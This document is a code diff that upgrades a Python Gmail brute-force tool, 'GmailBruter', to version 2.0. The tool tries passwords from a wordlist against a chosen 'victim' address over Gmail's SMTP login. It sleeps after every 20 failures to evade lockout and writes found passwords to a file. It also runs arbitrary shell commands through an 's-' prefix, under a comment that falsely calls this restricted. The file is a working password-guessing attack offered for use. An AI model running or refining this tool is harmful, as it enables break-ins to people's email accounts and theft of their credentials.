@@ -1,175 +1,201 @@
-import smtplib , os , sys , time
+import smtplib, os, sys, time
 
-Count = 0
-_Count = 0
+# ANSI Color Codes for Windows and Linux Support
+if os.name == 'nt':
+    os.system('color')
+
+C_WHITE = "\033[97m"
+C_GREEN = "\033[92m"
+C_RED = "\033[91m"
+C_YELLOW = "\033[93m"
+C_CYAN = "\033[96m"
+C_MAGENTA = "\033[95m"
+C_RESET = "\033[0m"
+C_BOLD = "\033[1m"
 
 def Banner():
-	Ban = "\n\t\t\t[>] SimpleGMailBruter [<]\n"; print(Ban)
+    banner_text = f"""
+{C_CYAN}{C_BOLD}    
+    ██████╗ ███╗   ███╗ █████╗ ██╗██╗     ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗ 
+    ██╔════╝ ████╗ ████║██╔══██╗██║██║     ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗
+    ██║  ███╗██╔████╔██║███████║██║██║     ██████╔╝██████╔╝██║   ██║   ██║   █████╗  ██████╔╝
+    ██║   ██║██║╚██╔╝██║██╔══██║██║██║     ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══██╗
+    ╚██████╔╝██║ ╚═╝ ██║██║  ██║██║███████╗██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║  ██║
+     ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝
+                                      {C_WHITE}Version: 2.0 | By: @mdaif1332{C_RESET}
+    """
+    print(banner_text)
 
-def StartBruteAccount(Passlist,account,SMTPServer,Count,_Count,Time):
-	with open('{0}'.format(Passlist),'r') as PasswordsFile:
-		for Password in PasswordsFile:
-			Password = Password.rstrip("\n")
-			try:
-				SMTPServer.login(account,Password)
-				print("[+] Valid Password Has Been Found: {0}, For: {1}".format(Password,account))
-				
-				# Create Data File!
-				with open('credits.txt' , 'a') as DataFile:
-					DataFile.write("\n--------------------------------------->"); DataFile.write("[+] Email: {0}\n".format(account)); DataFile.write("[+] Password: {0}\n".format(Password)); DataFile.write("--------------------------------------->");DataFile.close()
-				exit()
-			except smtplib.SMTPAuthenticationError:
-				Count += 1; _Count += 1
-				if Count == 20:
-					print("\n[!] Sleeping For {0} Seconds.".format(str(Time))); time.sleep(int(Time)); Count = 0
-					SMTPServer.close()
+def StartBruteAccount(passlist, account, smtp_server, delay_time):
+    count = 0
+    total_count = 0
+    
+    try:
+        with open(passlist, 'r', encoding='utf-8', errors='ignore') as f:
+            for password in f:
+                password = password.strip()
+                if not password: continue
+                
+                try:
+                    smtp_server.login(account, password)
+                    print(f"\n{C_GREEN}[+] Valid Password Found: {C_BOLD}{password}{C_RESET} for {C_BOLD}{account}{C_RESET}")
+                    
+                    with open('credits.txt', 'a') as df:
+                        df.write(f"\n[{time.ctime()}] Email: {account} | Password: {password}")
+                    return True
+                
+                except smtplib.SMTPAuthenticationError:
+                    count += 1
+                    total_count += 1
+                    print(f"\r{C_RED}[-] Bad Password ({total_count}): {C_RESET}{password[:20]:<20}", end="", flush=True)
+                    
+                    if count >= 20:
+                        print(f"\n{C_YELLOW}[!] Cooling down for {delay_time} seconds...{C_RESET}")
+                        time.sleep(int(delay_time))
+                        count = 0
+                        smtp_server.quit()
+                        smtp_server = StartSMTPService()
+                
+                except Exception as e:
+                    if "please run connect() first" in str(e).lower():
+                        print(f"\n{C_RED}[!] SMTP Disconnected. Service limit reached or connection lost.{C_RESET}")
+                        return False
+                    print(f"\n{C_RED}[!] Error: {str(e)}{C_RESET}")
+    except FileNotFoundError:
+        print(f"\n{C_RED}[!] Error: Passlist file '{passlist}' not found.{C_RESET}")
+    return False
 
-					SMTPServer = StartSMTPServiceForGmail()
-				else:
-					print("\rBad Password: {0}".format(Password + "   ") , end="")
-					sys.stdout.flush()
-			except Exception as e:
-				if "please run connect() first" in str(e):
-					SMTPServer.close()
-					print("\nThe SMTP Server Disconnected. Please Run The Tool Again After Changing Your IP Address Or After Waiting Sometime"); exit()
-				else:
-					print("Error: " + str(e))
-
-def StartSMTPServiceForGmail():
-	SMTPServer = smtplib.SMTP('smtp.gmail.com', 587)
-	SMTPServer.ehlo()
-	SMTPServer.starttls()
-	return SMTPServer
+def StartSMTPService():
+    try:
+        smtp = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
+        smtp.ehlo()
+        smtp.starttls()
+        return smtp
+    except Exception as e:
+        print(f"{C_RED}[!] Failed to connect to SMTP server: {e}{C_RESET}")
+        return None
 
 def HelpGuide():
-	print("\nHelp Guide For GmailBruterV2.")
-	print("Commands For Shell:")
-	print("\thelp\t\t--\tTo Show This Messages")
-	print("\tset target\t--\tTo Set The Victim Email Address")
-	print("\tset time\t--\tTo Set Time Between Every 10 Faild Passwords")
-	print("\tset list\t--\tTo Set PassList Name ")
-	print("\tshow target\t--\tTo Show You Current Target ")
-	print("\tshow time\t--\tTo Show You Current Time ")
-	print("\tshow list\t--\tTo Show You Current List ")
-	print("\tload\t\t--\tLoad Local Config For Settings")
-	print("\tstart\t\t--\tTo Start Brute Force Attack\n")
-	print("\texit\t\t--\tClose The Shell")
-
-def ContactMe():
-	Gmail =  "mdaif1332@gmail.com" # Don't perform the brute-force attacks on my email.
+    print(f"\n{C_BOLD}{C_CYAN}Help Guide For GmailBruterV2{C_RESET}")
+    print(f"{C_WHITE}----------------------------------------{C_RESET}")
+    print(f"{C_BOLD}help{C_RESET}          - Show this message")
+    print(f"{C_BOLD}set target{C_RESET}    - Set victim email address (e.g., example@gmail.com)")
+    print(f"{C_BOLD}set time{C_RESET}      - Set cooling time (seconds) after 20 attempts")
+    print(f"{C_BOLD}set list{C_RESET}      - Set path to password list file")
+    print(f"{C_BOLD}show{C_RESET}          - Show current session configuration")
+    print(f"{C_BOLD}load <path>{C_RESET}   - Load configuration from a file")
+    print(f"{C_BOLD}start{C_RESET}         - Begin the brute force attack")
+    print(f"{C_BOLD}clear{C_RESET}         - Clear the screen")
+    print(f"{C_BOLD}exit{C_RESET}          - Exit the program\n")
 
 def StartShell():
-	# store how many times the user pressed Ctrl + C
-	AbortCount = 0
-	Commands = []
-	Account = ''
-	Time = ''
-	PassList = ''
-	with open(os.path.join("data" , "Commands") ,'r') as CommandsFile:
-		for Command in CommandsFile:
-			Command = Command.rstrip("\n")
-			Commands.append(Command)
-	while True:
-		# init variable to store user input
-		ShellResponse = ''
-		try:
-			# get input from user
-			ShellResponse = input("root@GmailBruter: ")
+    account = ''
+    delay_time = '60'  # Default value
+    passlist = 'PassList.txt' # Default value
+    
+    while True:
+        try:
+            prompt = f"{C_CYAN}{C_BOLD}GmailBruter{C_RESET} > "
+            shell_response = input(prompt).strip()
+            if not shell_response:
+                continue
 
-		# handle Ctrl + C
-		except KeyboardInterrupt:
-			# increment AbortCount
-			AbortCount += 1
-			# print \n to print the new shell line on the next line
-			print()
-			# if the user pressed Ctrl + C two times
-			if AbortCount >= 2:
-				# print hint
-				print("[!] Press Ctrl + D or enter 'exit' to abort the program.")
-				# reset abortcount
-				AbortCount = 0
-			continue
-		# handle Ctrl + D
-		# Ctrl + D normally indicated the end of a file
-		# this is why python throws an EOFError
-		except EOFError:
-			print()
-			exit()
+            cmd_parts = shell_response.lower().split()
+            cmd = cmd_parts[0]
 
-		if ShellResponse.lower().replace(' ' , '') not in Commands:
-			if "s-" in ShellResponse.lower():
-				Command = ShellResponse.split("-"); Command = Command[1]
-				Results = os.popen(Command).read()
-				print("Command:" + Command)
-				print("Results: \n{0}".format(Results))
-			else:
-				print("Can't find the command: '{0}'".format(ShellResponse))
-		elif ShellResponse.lower() == "help":
-			HelpGuide()
-		elif ShellResponse.lower().replace(' ' , '') == "settarget":
-			Account = input("Target: ")
-		elif ShellResponse.lower().replace(' ' , '') == "settime":
-			Time = input("Time: ")
-		elif ShellResponse.lower().replace(' ' , '') == "setlist":
-			PassList = input("List: ")
-		elif ShellResponse.lower().replace(' ' , '') == "showtarget":
-			if Account == '':
-				print("[-] There's no target on the settings")
-			else:
-				print("Target: " + Account)
-		elif ShellResponse.lower().replace(' ' , '') == "showtime":
-			if Time == '':
-				print("[-] There's no time has been set")
-			else:
-				print("Time: " + Time)
-		elif ShellResponse.lower().replace(' ' , '') == "showlist":
-			if PassList == '':
-				print("[-] You didn't select a list")
-			else:
-				print("List: " + PassList)
-		elif ShellResponse.lower() == "start":
-			StartSMTPServiceForGmail()
-			Service = StartSMTPServiceForGmail()
-			if Account == '':
-				print("[!] Set Target!")
-				break
-			elif PassList == '':
-				print("[!] Set List!")
-				break
-			elif Time == '':
-				print("[!] Set Time!")
-				break
-			else:
-				StartBruteAccount(PassList,Account,Service,Count,_Count,Time)
-		elif ShellResponse.lower() == "exit":
-			exit()
-		elif ShellResponse.lower() == "load":
-			Config = input("Path: ")
-			if os.path.exists(Config):
-				Settings = open(Config , 'r')
+            if cmd == "help":
+                HelpGuide()
+            
+            elif cmd == "set":
+                if len(cmd_parts) < 3:
+                    print(f"{C_RED}[!] Usage: set <target|time|list> <value>{C_RESET}")
+                    continue
+                
+                key = cmd_parts[1]
+                val = " ".join(cmd_parts[2:]) # Handle paths with spaces
 
-				for Line in Settings:
-					Line = Line.rstrip("\n"); Options = Line.split(":")
+                if key == "target":
+                    account = val
+                    print(f"{C_GREEN}[+] Target set to: {C_BOLD}{account}{C_RESET}")
+                elif key == "time":
+                    delay_time = val
+                    print(f"{C_GREEN}[+] Cooling time set to: {C_BOLD}{delay_time}{C_RESET}s")
+                elif key == "list":
+                    passlist = val
+                    print(f"{C_GREEN}[+] Passlist set to: {C_BOLD}{passlist}{C_RESET}")
+                else:
+                    print(f"{C_RED}[!] Unknown setting: {key}{C_RESET}")
 
-					try:
-						if Options[0] == "email":
-							Account = Options[1]
-							print("Target: {0}".format(Options[1]))
-						elif Options[0] == "list":
-							PassList = Options[1]
-							print("List: {0}".format(PassList))
-						elif Options[0] == "time":
-							Time = Options[1]
-							print("Time: {0}".format(Time))
-						else:
-							print("[-] Invalid Config. Please check it again.")
-					except Exception:
-						print("[-] Invalid Config. Please check it again.")
-			else:
-				print("[-] The config file you selected doesn't exists")
-		else:
-			pass
+            elif cmd == "show":
+                print(f"\n{C_BOLD}{C_CYAN}Session Configuration:{C_RESET}")
+                print(f"Target Email : {C_YELLOW}{account if account else 'Not Set'}{C_RESET}")
+                print(f"Cooling Time : {C_YELLOW}{delay_time} seconds{C_RESET}")
+                print(f"Password List: {C_YELLOW}{passlist}{C_RESET}\n")
 
-# Start
-Banner()
-StartShell()
+            elif cmd == "start":
+                if not account:
+                    print(f"{C_RED}[!] Error: Target email not set. Use 'set target <email>'{C_RESET}")
+                    continue
+                if not os.path.exists(passlist):
+                    print(f"{C_RED}[!] Error: Passlist file '{passlist}' does not exist.{C_RESET}")
+                    continue
+                
+                print(f"{C_CYAN}[*] Initializing SMTP connection...{C_RESET}")
+                service = StartSMTPService()
+                if service:
+                    print(f"{C_GREEN}[+] Connected! Starting attack...{C_RESET}")
+                    StartBruteAccount(passlist, account, service, delay_time)
+                    service.quit()
+                else:
+                    print(f"{C_RED}[!] Could not start attack without SMTP connection.{C_RESET}")
+
+            elif cmd == "load":
+                config_path = " ".join(cmd_parts[1:]) if len(cmd_parts) > 1 else input("Path: ")
+                if os.path.exists(config_path):
+                    with open(config_path, 'r') as f:
+                        for line in f:
+                            line = line.strip()
+                            if not line or ':' not in line: continue
+                            key, val = line.split(':', 1)
+                            key = key.strip().lower()
+                            val = val.strip()
+                            if key == "email" or key == "target":
+                                account = val
+                                print(f"{C_GREEN}[+] Target Loaded: {val}{C_RESET}")
+                            elif key == "list":
+                                passlist = val
+                                print(f"{C_GREEN}[+] List Loaded: {val}{C_RESET}")
+                            elif key == "time":
+                                delay_time = val
+                                print(f"{C_GREEN}[+] Time Loaded: {val}{C_RESET}")
+                else:
+                    print(f"{C_RED}[!] Config file not found: {config_path}{C_RESET}")
+
+            elif cmd == "clear":
+                os.system('cls' if os.name == 'nt' else 'clear')
+                Banner()
+
+            elif cmd == "exit":
+                print(f"{C_YELLOW}Exiting... Goodbye!{C_RESET}")
+                sys.exit(0)
+
+            elif shell_response.startswith("s-"):
+                # Restricted shell execution for convenience
+                shell_cmd = shell_response[2:]
+                print(f"{C_CYAN}[*] Executing system command: {shell_cmd}{C_RESET}")
+                os.system(shell_cmd)
+            
+            else:
+                print(f"{C_RED}[!] Unknown command: '{cmd}'. Type 'help' for available commands.{C_RESET}")
+
+        except KeyboardInterrupt:
+            print(f"\n{C_YELLOW}[!] Interrupted. Type 'exit' to quit.{C_RESET}")
+        except EOFError:
+            print(f"\n{C_YELLOW}[!] EOF received. Exiting...{C_RESET}")
+            sys.exit(0)
+        except Exception as e:
+            print(f"{C_RED}[!] Critical Error in Shell: {e}{C_RESET}")
+
+if __name__ == "__main__":
+    Banner()
+    StartShell()
